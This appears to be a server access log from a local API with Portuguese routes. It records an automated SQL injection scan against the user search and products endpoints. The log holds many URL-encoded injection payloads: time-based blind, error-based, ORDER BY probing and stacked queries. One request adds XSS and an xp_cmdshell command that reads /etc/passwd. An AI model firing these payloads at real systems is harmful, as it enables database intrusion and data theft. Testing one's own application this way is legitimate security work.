api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:60576 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27oksK%27%3D%27oksK HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60586 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27ZLtV%27%3D%27ZLtV HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60596 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%286740%3D6740 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60622 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60624 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2Fimmg HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60612 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9049%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28111%29%7C%7CCHR%2886%29%7C%7CCHR%2899%29%7C%7CCHR%2865%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27IBPd%27%3D%27IBPd HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60634 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9049%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28111%29%7C%7CCHR%2886%29%7C%7CCHR%2899%29%7C%7CCHR%2865%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27cOYz%27%3D%27cOYz HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60650 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F9049%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28111%29%7C%7CCHR%2886%29%7C%7CCHR%2899%29%7C%7CCHR%2865%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%286338%3D6338 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60664 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9049%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28111%29%7C%7CCHR%2886%29%7C%7CCHR%2899%29%7C%7CCHR%2865%29%2C5%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60660 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9049%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28111%29%7C%7CCHR%2886%29%7C%7CCHR%2899%29%7C%7CCHR%2865%29%2C5%29--%2F%2A%2A%2FYdjE HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60674 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FzAJI HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60676 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5235--%2F%2A%2A%2FlFXj HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60670 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FJpbm HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60690 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F8418--%2F%2A%2A%2FGamY HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60680 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FakpG HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60704 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5649--%2F%2A%2A%2FVCGl HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60708 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FmfsO HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60706 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F3397--%2F%2A%2A%2FpBEF HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60724 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FnZiR HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60730 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5477--%2F%2A%2A%2FTKZJ HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60750 - "GET /produtos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60760 - "GET /produtos?pcaz=3052%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60770 - "GET /produtos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60772 - "GET /6545 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60784 - "GET /produtos%22%29.%2C%2C.%27%2C%29. HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60788 - "GET /produtos%27IqETeI%3C%27%22%3EAuVaxp HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60794 - "GET /produtos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60802 - "GET /produtos%29/%2A%2A/AND/%2A%2A/3052%3D6754/%2A%2A/AND/%2A%2A/%284869%3D4869 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60820 - "GET /produtos%29/%2A%2A/AND/%2A%2A/2819%3D2819/%2A%2A/AND/%2A%2A/%282285%3D2285 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60822 - "GET /produtos/%2A%2A/AND/%2A%2A/4969%3D1336 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60818 - "GET /produtos/%2A%2A/AND/%2A%2A/2819%3D2819 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60830 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/8820%3D4665/%2A%2A/AND/%2A%2A/%28%27rOYc%27%3D%27rOYc HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60844 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/2819%3D2819/%2A%2A/AND/%2A%2A/%28%27EKMU%27%3D%27EKMU HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60854 - "GET /produtos%27/%2A%2A/AND/%2A%2A/3426%3D3503/%2A%2A/AND/%2A%2A/%27QJEI%27%3D%27QJEI HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60870 - "GET /produtos%27/%2A%2A/AND/%2A%2A/2819%3D2819/%2A%2A/AND/%2A%2A/%27OtoC%27%3D%27OtoC HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60876 - "GET /produtos/%2A%2A/AND/%2A%2A/3732%3D9294--/%2A%2A/UZfr HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60890 - "GET /produtos/%2A%2A/AND/%2A%2A/2819%3D2819--/%2A%2A/srhs HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60904 - "GET /%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%287498%3D7521%29/%2A%2A/THEN/%2A%2A/%27produtos%27/%2A%2A/ELSE/%2A%2A/%28SELECT/%2A%2A/7521/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/6409%29/%2A%2A/END%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60912 - "GET /%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281910%3D1910%29/%2A%2A/THEN/%2A%2A/%27produtos%27/%2A%2A/ELSE/%2A%2A/%28SELECT/%2A%2A/1025/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/7555%29/%2A%2A/END%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60928 - "GET /produtos%29/%2A%2A/AND/%2A%2A/EXTRACTVALUE%287776%2CCONCAT%280x5c%2C0x7171627071%2C%28SELECT/%2A%2A/%28ELT%287776%3D7776%2C1%29%29%29%2C0x71706b7171%29%29/%2A%2A/AND/%2A%2A/%289878%3D9878 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60918 - "GET /produtos/%2A%2A/AND/%2A%2A/EXTRACTVALUE%287776%2CCONCAT%280x5c%2C0x7171627071%2C%28SELECT/%2A%2A/%28ELT%287776%3D7776%2C1%29%29%29%2C0x71706b7171%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60936 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/EXTRACTVALUE%287776%2CCONCAT%280x5c%2C0x7171627071%2C%28SELECT/%2A%2A/%28ELT%287776%3D7776%2C1%29%29%29%2C0x71706b7171%29%29/%2A%2A/AND/%2A%2A/%28%27TnKL%27%3D%27TnKL HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60938 - "GET /produtos%27/%2A%2A/AND/%2A%2A/EXTRACTVALUE%287776%2CCONCAT%280x5c%2C0x7171627071%2C%28SELECT/%2A%2A/%28ELT%287776%3D7776%2C1%29%29%29%2C0x71706b7171%29%29/%2A%2A/AND/%2A%2A/%27RXRH%27%3D%27RXRH HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60950 - "GET /produtos/%2A%2A/AND/%2A%2A/EXTRACTVALUE%287776%2CCONCAT%280x5c%2C0x7171627071%2C%28SELECT/%2A%2A/%28ELT%287776%3D7776%2C1%29%29%29%2C0x71706b7171%29%29--/%2A%2A/TNYP HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60952 - "GET /produtos%29/%2A%2A/AND/%2A%2A/4652%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%284652%3D4652%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%286543%3D6543 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60954 - "GET /produtos/%2A%2A/AND/%2A%2A/4652%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%284652%3D4652%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60968 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/4652%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%284652%3D4652%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%28%27ixhV%27%3D%27ixhV HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60970 - "GET /produtos%27/%2A%2A/AND/%2A%2A/4652%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%284652%3D4652%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%27mliL%27%3D%27mliL HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60978 - "GET /produtos/%2A%2A/AND/%2A%2A/4652%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%284652%3D4652%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29--/%2A%2A/tUag HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60986 - "GET /produtos%29/%2A%2A/AND/%2A%2A/1370/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281370%3D1370%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%285306%3D5306 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60994 - "GET /produtos/%2A%2A/AND/%2A%2A/1370/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281370%3D1370%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32770 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/1370/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281370%3D1370%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%28%27SseG%27%3D%27SseG HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32784 - "GET /produtos%27/%2A%2A/AND/%2A%2A/1370/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281370%3D1370%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%27HSQN%27%3D%27HSQN HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32794 - "GET /produtos/%2A%2A/AND/%2A%2A/1370/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281370%3D1370%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29--/%2A%2A/TbRT HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32808 - "GET /produtos%29/%2A%2A/AND/%2A%2A/6982%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286982%3D6982%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%288406%3D8406 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32810 - "GET /produtos/%2A%2A/AND/%2A%2A/6982%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286982%3D6982%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32814 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/6982%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286982%3D6982%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%28%27FgAW%27%3D%27FgAW HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32816 - "GET /produtos%27/%2A%2A/AND/%2A%2A/6982%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286982%3D6982%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%27YZbL%27%3D%27YZbL HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32832 - "GET /produtos/%2A%2A/AND/%2A%2A/6982%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286982%3D6982%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29--/%2A%2A/XEqe HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32844 - "GET /%28SELECT/%2A%2A/CONCAT%28CONCAT%28%27qqbpq%27%2C%28CASE/%2A%2A/WHEN/%2A%2A/%289283%3D9283%29/%2A%2A/THEN/%2A%2A/%271%27/%2A%2A/ELSE/%2A%2A/%270%27/%2A%2A/END%29%29%2C%27qpkqq%27%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32848 - "GET /produtos%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32858 - "GET /produtos%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32860 - "GET /produtos%27%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32864 - "GET /produtos%27%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32880 - "GET /produtos%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32882 - "GET /produtos%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32904 - "GET /produtos%27%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32908 - "GET /produtos%27%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32920 - "GET /produtos%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28121%29%7C%7CCHR%28100%29%7C%7CCHR%2883%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32924 - "GET /produtos%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28121%29%7C%7CCHR%28100%29%7C%7CCHR%2883%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32938 - "GET /produtos%27%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28121%29%7C%7CCHR%28100%29%7C%7CCHR%2883%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32890 - "GET /produtos%27%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28121%29%7C%7CCHR%28100%29%7C%7CCHR%2883%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32954 - "GET /produtos%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/5687/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29Qibr%29/%2A%2A/AND/%2A%2A/%284304%3D4304 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32962 - "GET /produtos/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/5687/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29Qibr%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32970 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/5687/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29Qibr%29/%2A%2A/AND/%2A%2A/%28%27vRDw%27%3D%27vRDw HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32984 - "GET /produtos%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/5687/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29Qibr%29/%2A%2A/AND/%2A%2A/%27oloU%27%3D%27oloU HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:32990 - "GET /produtos/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/5687/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29Qibr%29--/%2A%2A/Tnih HTTP/1.1" 404 Not Found
